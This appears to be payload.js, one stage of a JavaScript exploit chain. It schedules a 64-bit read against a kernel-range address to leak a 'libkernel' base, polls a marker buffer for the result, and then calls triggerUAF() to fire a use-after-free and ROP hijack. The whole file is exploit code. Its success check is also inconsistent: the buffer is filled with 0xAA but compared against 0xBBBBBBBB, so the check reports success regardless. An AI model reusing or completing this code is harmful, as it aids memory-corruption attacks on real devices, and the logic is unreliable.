// payload.js

window.read_target = new Uint8Array(8);

function run_payload() {
  debug_log("Payload started. Setting up read64 test...");

  // Fill buffer with known marker
  for (let i = 0; i < 8; i++) read_target[i] = 0xAA;

  // Schedule read64 ROP (will leak libkernel base)
  schedule_read64(0xFFFFFFFF82600000);

  // Poll for result before ROP hijacks thread
  let tries = 0;
  const view = new DataView(read_target.buffer);
  const interval = setInterval(() => {
    const lo = view.getUint32(0, true);
    const hi = view.getUint32(4, true);

    if (lo !== 0xAAAAAAAA || hi !== 0xBBBBBBBB) {
      const result = (BigInt(hi) << 32n) | BigInt(lo);
      debug_log("✅ read64 success: 0x" + result.toString(16));
      clearInterval(interval);
    }

    if (++tries > 10) {
      debug_log("❌ read64 timeout — no change in read_target");
      clearInterval(interval);
    }
  }, 200);

  // Trigger ROP 1 second later to give polling time
  setTimeout(() => {
    debug_log("Triggering UAF and ROP...");
    triggerUAF();
  }, 1000);
}
